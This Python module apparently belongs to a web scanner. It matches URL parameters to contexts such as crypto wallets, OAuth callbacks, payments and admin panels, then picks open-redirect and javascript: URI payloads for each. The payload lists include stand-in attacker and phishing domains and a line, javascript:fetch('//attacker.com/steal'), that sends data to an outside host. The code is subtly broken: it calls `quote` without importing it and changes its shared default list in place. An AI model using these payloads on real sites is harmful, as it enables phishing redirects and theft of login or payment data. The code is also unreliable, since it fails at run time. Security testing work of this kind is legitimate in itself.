#!/usr/bin/env python3
"""
🔥 AI-POWERED CONTEXT DETECTION ENGINE
"""

import re
from typing import Dict, List, Optional
from data_models import Parameter


class ContextEngine:
    """AI-powered context detection and payload selection"""
    
    def __init__(self):
        # Context patterns with weights
        self.context_patterns = {
            'web3_wallet': {
                'patterns': [r'wallet.*connect', r'metamask', r'web3.*provider', r'ethereum.*address'],
                'weight': 0.9,
                'payload_type': 'web3'
            },
            'defi_swap': {
                'patterns': [r'swap.*token', r'uniswap', r'pancakeswap', r'exchange.*rate'],
                'weight': 0.85,
                'payload_type': 'defi'
            },
            'nft_marketplace': {
                'patterns': [r'nft.*buy', r'opensea', r'rarible', r'mint.*token'],
                'weight': 0.8,
                'payload_type': 'nft'
            },
            'oauth_callback': {
                'patterns': [r'oauth.*callback', r'auth.*redirect', r'login.*success'],
                'weight': 0.9,
                'payload_type': 'oauth'
            },
            'payment_redirect': {
                'patterns': [r'payment.*success', r'checkout.*complete', r'order.*confirm'],
                'weight': 0.85,
                'payload_type': 'payment'
            },
            'api_endpoint': {
                'patterns': [r'api/v\d+', r'rest.*api', r'graphql'],
                'weight': 0.7,
                'payload_type': 'api'
            },
            'admin_panel': {
                'patterns': [r'admin.*panel', r'dashboard', r'control.*panel'],
                'weight': 0.95,
                'payload_type': 'admin'
            }
        }
        
        # Payload selection by context
        self.context_payloads = {
            'web3': [
                "//fake-metamask.io",
                "//phishing-wallet.com",
                "ethereum://0x1234567890123456789012345678901234567890",
                "web3://malicious-dapp.eth"
            ],
            'defi': [
                "//fake-uniswap.org",
                "//phishing-compound.finance",
                "//malicious-aave.com"
            ],
            'nft': [
                "//fake-opensea.io",
                "//phishing-rarible.com",
                "//malicious-foundation.app"
            ],
            'oauth': [
                "//evil.com/oauth/callback",
                "//attacker.com/login/success",
                "javascript:confirm('OAuth Hijacked')"
            ],
            'payment': [
                "//fake-stripe.com",
                "//phishing-paypal.com",
                "//malicious-payment.com"
            ],
            'api': [
                "//evil.com/api/v1/callback",
                "javascript:fetch('//attacker.com/steal')",
                "//malicious-api.com/webhook"
            ],
            'admin': [
                "//evil.com/admin/backdoor",
                "javascript:confirm('Admin Panel Compromised')",
                "//attacker.com/control"
            ],
            'default': [
                "//evil.com",
                "https://google.com",
                "javascript:confirm(1)",
                "//216.58.214.206"
            ]
        }
    
    def detect_context(self, param: Parameter, page_content: str = "") -> Dict[str, any]:
        """Detect parameter context using AI-like analysis"""
        context_scores = {}
        detected_context = 'default'
        max_score = 0.0
        
        # Analyze parameter name and value
        param_text = f"{param.name} {param.value} {param.url} {page_content[:1000]}"
        param_text_lower = param_text.lower()
        
        # Score each context
        for context_name, context_info in self.context_patterns.items():
            score = 0.0
            matched_patterns = []
            
            for pattern in context_info['patterns']:
                matches = len(re.findall(pattern, param_text_lower, re.IGNORECASE))
                if matches > 0:
                    score += context_info['weight'] * matches
                    matched_patterns.append(pattern)
            
            # Boost score based on parameter context
            if param.context == 'web3_config' and context_name.startswith('web3'):
                score += 0.3
            elif param.source == 'javascript' and 'api' in context_name:
                score += 0.2
            
            context_scores[context_name] = {
                'score': score,
                'matched_patterns': matched_patterns
            }
            
            if score > max_score:
                max_score = score
                detected_context = context_name
        
        # Get payload type safely
        payload_type = 'default'
        if detected_context in self.context_patterns:
            payload_type = self.context_patterns[detected_context]['payload_type']
        
        return {
            'primary_context': detected_context,
            'confidence': min(max_score, 1.0),
            'all_scores': context_scores,
            'payload_type': payload_type
        }
    
    def select_optimal_payloads(self, param: Parameter, context_info: Dict, page_content: str = "") -> List[str]:
        """Select optimal payloads based on context"""
        payload_type = context_info['payload_type']
        confidence = context_info['confidence']
        
        # Get base payloads for context
        base_payloads = self.context_payloads.get(payload_type, self.context_payloads['default'])
        
        # Add default payloads if confidence is low
        if confidence < 0.5:
            base_payloads.extend(self.context_payloads['default'][:5])
        
        # Customize payloads based on parameter
        customized_payloads = []
        
        for payload in base_payloads:
            customized_payloads.append(payload)
            
            # Add parameter-specific variations
            if param.name in ['callback', 'success_url', 'return_url']:
                customized_payloads.append(f"{payload}?original_param={param.name}")
            
            # Add encoding variations for high-value contexts
            if confidence > 0.8:
                customized_payloads.append(quote(payload))
                customized_payloads.append(payload.replace('//', '%2f%2f'))
        
        return list(set(customized_payloads))[:15]  # Limit to 15 payloads per parameter
    
    def analyze_business_context(self, url: str, content: str) -> Dict[str, any]:
        """Analyze business context of the application"""
        business_indicators = {
            'ecommerce': [r'cart', r'checkout', r'payment', r'order', r'shop'],
            'banking': [r'bank', r'account', r'balance', r'transfer', r'loan'],
            'social': [r'social', r'friend', r'follow', r'share', r'post'],
            'enterprise': [r'enterprise', r'corporate', r'business', r'company'],
            'gaming': [r'game', r'player', r'score', r'level', r'achievement'],
            'crypto': [r'crypto', r'bitcoin', r'blockchain', r'mining', r'wallet'],
            'defi': [r'defi', r'yield', r'stake', r'liquidity', r'farming'],
            'nft': [r'nft', r'collectible', r'rare', r'mint', r'marketplace']
        }
        
        content_lower = content.lower()
        url_lower = url.lower()
        combined_text = f"{url_lower} {content_lower}"
        
        business_scores = {}
        for business_type, indicators in business_indicators.items():
            score = sum(1 for indicator in indicators if indicator in combined_text)
            business_scores[business_type] = score
        
        # Determine primary business type
        primary_business = max(business_scores.keys(), key=lambda k: business_scores[k])
        
        return {
            'primary_business': primary_business,
            'business_scores': business_scores,
            'is_high_value_target': business_scores[primary_business] > 2
        }
    
    def generate_context_report(self, analyzed_params: List[Dict]) -> Dict:
        """Generate context analysis report"""
        context_distribution = {}
        payload_distribution = {}
        
        for param_analysis in analyzed_params:
            context = param_analysis['primary_context']
            payload_type = param_analysis['payload_type']
            
            context_distribution[context] = context_distribution.get(context, 0) + 1
            payload_distribution[payload_type] = payload_distribution.get(payload_type, 0) + 1
        
        return {
            'total_analyzed': len(analyzed_params),
            'context_distribution': context_distribution,
            'payload_distribution': payload_distribution,
            'high_confidence_contexts': len([p for p in analyzed_params if p['confidence'] > 0.7]),
            'web3_parameters_detected': payload_distribution.get('web3', 0) + payload_distribution.get('defi', 0) + payload_distribution.get('nft', 0)
        }